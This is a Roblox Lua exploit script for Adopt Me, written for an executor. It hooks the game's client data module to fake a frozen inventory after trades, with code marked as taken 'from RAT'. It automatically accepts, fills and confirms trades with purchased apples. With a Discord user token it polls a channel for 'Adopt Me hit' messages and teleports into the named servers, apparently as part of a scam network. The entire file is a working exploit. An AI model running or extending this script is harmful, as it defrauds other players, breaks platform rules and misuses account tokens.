if not game:IsLoaded() then
	game.Loaded:Wait()
end

if token == "" or channelId == "" then
	game.Players.LocalPlayer:Kick("Add your token or channelId to use")
end

local Players = game:GetService("Players")
local HttpServ = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local bb = game:GetService("VirtualUser")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local playerGui = Players.LocalPlayer:WaitForChild("PlayerGui")

local StatusGui = Instance.new("ScreenGui")
StatusGui.Name = "StatusGui"
StatusGui.ResetOnSpawn = false
StatusGui.DisplayOrder = 999
StatusGui.Parent = playerGui

local StatusFrame = Instance.new("Frame")
StatusFrame.Size = UDim2.new(0, 160, 0, 36)
StatusFrame.Position = UDim2.new(0.5, -80, 0, 10)
StatusFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
StatusFrame.BorderSizePixel = 0
StatusFrame.Parent = StatusGui
Instance.new("UICorner", StatusFrame).CornerRadius = UDim.new(0, 8)

local StatusLabel = Instance.new("TextLabel")
StatusLabel.Size = UDim2.new(1, 0, 1, 0)
StatusLabel.BackgroundTransparency = 1
StatusLabel.Text = "Status: Loading..."
StatusLabel.TextColor3 = Color3.fromRGB(255, 255, 0)
StatusLabel.Font = Enum.Font.GothamBold
StatusLabel.TextSize = 14
StatusLabel.Parent = StatusFrame

local function setStatus(working)
	if working then
		StatusLabel.Text = "Status: Working"
		StatusLabel.TextColor3 = Color3.fromRGB(0, 255, 100)
		StatusFrame.BackgroundColor3 = Color3.fromRGB(10, 40, 20)
	else
		StatusLabel.Text = "Status: Not Working"
		StatusLabel.TextColor3 = Color3.fromRGB(255, 60, 60)
		StatusFrame.BackgroundColor3 = Color3.fromRGB(40, 10, 10)
	end
end

Players.LocalPlayer.Idled:Connect(function()
	bb:CaptureController()
	bb:ClickButton2(Vector2.new())
end)

if not isfile("joined_ids_adm.txt") then
	writefile("joined_ids_adm.txt", "[]")
end
local joinedIds = HttpServ:JSONDecode(readfile("joined_ids_adm.txt"))

local loadingScreen = playerGui:WaitForChild("AssetLoadUI")
while loadingScreen.Enabled do task.wait(1) end
task.wait(5)

local tradeFrame = playerGui.TradeApp.Frame
local RouterClient = require(ReplicatedStorage.Fsys).load("RouterClient")
local ClientDataModule = require(ReplicatedStorage.ClientModules.Core.ClientData)

local AcceptDecline           = RouterClient.get("TradeAPI/AcceptOrDeclineTradeRequest")
local AddItemRemote           = RouterClient.get("TradeAPI/AddItemToOffer")
local AcceptNegotiationRemote = RouterClient.get("TradeAPI/AcceptNegotiation")
local ConfirmTradeRemote      = RouterClient.get("TradeAPI/ConfirmTrade")
local BuyItemRemote           = RouterClient.get("ShopAPI/BuyItem")

-- DeepCopy helper (from RAT)
local DeepCopy
DeepCopy = function(Value, Depth)
	local Max = Depth or 10
	if not (Max <= 0) then
		if type(Value) == "table" then
			local Copy = {}
			for Key, Item in pairs(Value) do
				if type(Item) == "table" then
					Copy[Key] = DeepCopy(Item, Max - 1)
				else
					Copy[Key] = Item
				end
			end
			return Copy
		end
	end
	return Value
end

-- SnapshotInventory: freezes inventory so traded-away items never disappear (from RAT)
local function SnapshotInventory()
	pcall(function()
		local Keys = { "inventory", "equip_manager", "pet_saved_worn_items", "backpack", "pets" }
		local Attempts = 0
		local Module = ClientDataModule

		while not (Module.get_data() or not (Attempts < 100)) do
			task.wait(0.1)
			Attempts += 1
		end

		if not Module.get_data() then return end

		local PlayerName = Players.LocalPlayer.Name
		local AllData = Module.get_data()
		local Snapshot = {}

		if AllData[PlayerName] then
			for _, Key in ipairs(Keys) do
				if AllData[PlayerName][Key] then
					Snapshot[Key] = DeepCopy(AllData[PlayerName][Key], 5)
				end
			end
		end

		local Original = { get = Module.get }

		Module.get = function(Key)
			if table.find(Keys, Key) and Snapshot[Key] then
				return Snapshot[Key]
			end
			return Original.get(Key)
		end

		Original.getServer = Module.get_server
		Module.get_server = function(Player, Key)
			if Player ~= Players.LocalPlayer or not (table.find(Keys, Key) and Snapshot[Key]) then
				return Original.getServer(Player, Key)
			end
			return Snapshot[Key]
		end

		Original.update = Module.update
		Module.update = function(Key, Value)
			if table.find(Keys, Key) then return end
			return Original.update(Key, Value)
		end

		Original.updateServer = Module.update_server
		Module.update_server = function(Player, Key, Value)
			if Player ~= Players.LocalPlayer or not table.find(Keys, Key) then
				return Original.updateServer(Player, Key, Value)
			end
		end

		Original.predict = Module.predict
		Module.predict = function(Key, Value)
			if table.find(Keys, Key) then return end
			return Original.predict(Key, Value)
		end

		Original.registerServerOnChangeHook = Module.register_server_on_change_hook
		Module.register_server_on_change_hook = function(Key, Callback, Extra)
			if table.find(Keys, Key) then
				return function() end
			end
			return Original.registerServerOnChangeHook(Key, Callback, Extra)
		end

		local Current = Module.get_data()
		if Current and Current[PlayerName] then
			for _, Key in ipairs(Keys) do
				if Current[PlayerName][Key] and Snapshot[Key] then
					Current[PlayerName][Key] = Snapshot[Key]
				end
			end
		end
	end)
end

-- Freeze inventory snapshot before anything else runs
SnapshotInventory()

setStatus(true)

local function IsTrading()
	return tradeFrame.Visible
end

local foodAdded = false
local timer = 0

task.spawn(function()
	while task.wait(0.05) do
		if not IsTrading() then
			for _, player in ipairs(Players:GetPlayers()) do
				if player ~= Players.LocalPlayer then
					pcall(function()
						AcceptDecline:InvokeServer(player, true)
					end)
				end
			end
		end
	end
end)

task.spawn(function()
	while task.wait(0.05) do
		if IsTrading() then
			if not foodAdded then
				-- Buy 5 teachers apples before adding (restocks every trade)
				pcall(function()
					BuyItemRemote:InvokeServer("food", "teachers_apple", { buy_count = 5 })
				end)

				local appleKeys = {}
				local food = ClientDataModule.get("inventory").food
				if food then
					for uid, item in pairs(food) do
						if item.kind == "teachers_apple" then
							table.insert(appleKeys, uid)
						end
					end
				end

				if #appleKeys > 0 then
					for i = 1, math.min(17, #appleKeys) do
						AddItemRemote:FireServer(appleKeys[i])
					end
					foodAdded = true
				end
			end
			AcceptNegotiationRemote:FireServer()
		end
	end
end)

task.spawn(function()
	while task.wait(0.05) do
		if IsTrading() and foodAdded then
			ConfirmTradeRemote:FireServer()
		end
	end
end)

task.spawn(function()
	while task.wait(1) do
		if IsTrading() then
			timer = 0
		else
			timer += 1
			foodAdded = false
		end
	end
end)

local function saveJoinedId(id)
	table.insert(joinedIds, id)
	writefile("joined_ids_adm.txt", HttpServ:JSONEncode(joinedIds))
end

local function autoJoin()
	local response = request({
		Url = "https://discord.com/api/v9/channels/" .. channelId .. "/messages?limit=10",
		Method = "GET",
		Headers = {
			["Authorization"] = token,
			["User-Agent"] = "Mozilla/5.0",
			["Content-Type"] = "application/json"
		}
	})

	if response.StatusCode ~= 200 then return end

	local messages = HttpServ:JSONDecode(response.Body)
	for _, message in ipairs(messages) do
		if message.embeds and message.embeds[1] and message.embeds[1].title then
			if message.embeds[1].title:find("Join to get Adopt Me hit") then
				local placeId, jobId =
					string.match(message.content,
						'TeleportToPlaceInstance%((%d+),%s*["\']([%w%-]+)["\']%)')

				if placeId and jobId and timer > 4 then
					if not table.find(joinedIds, tostring(message.id)) then
						saveJoinedId(tostring(message.id))
						TeleportService:TeleportToPlaceInstance(placeId, jobId)
						return
					end
				end
			end
		end
	end
end

while task.wait(2) do
	autoJoin()
end
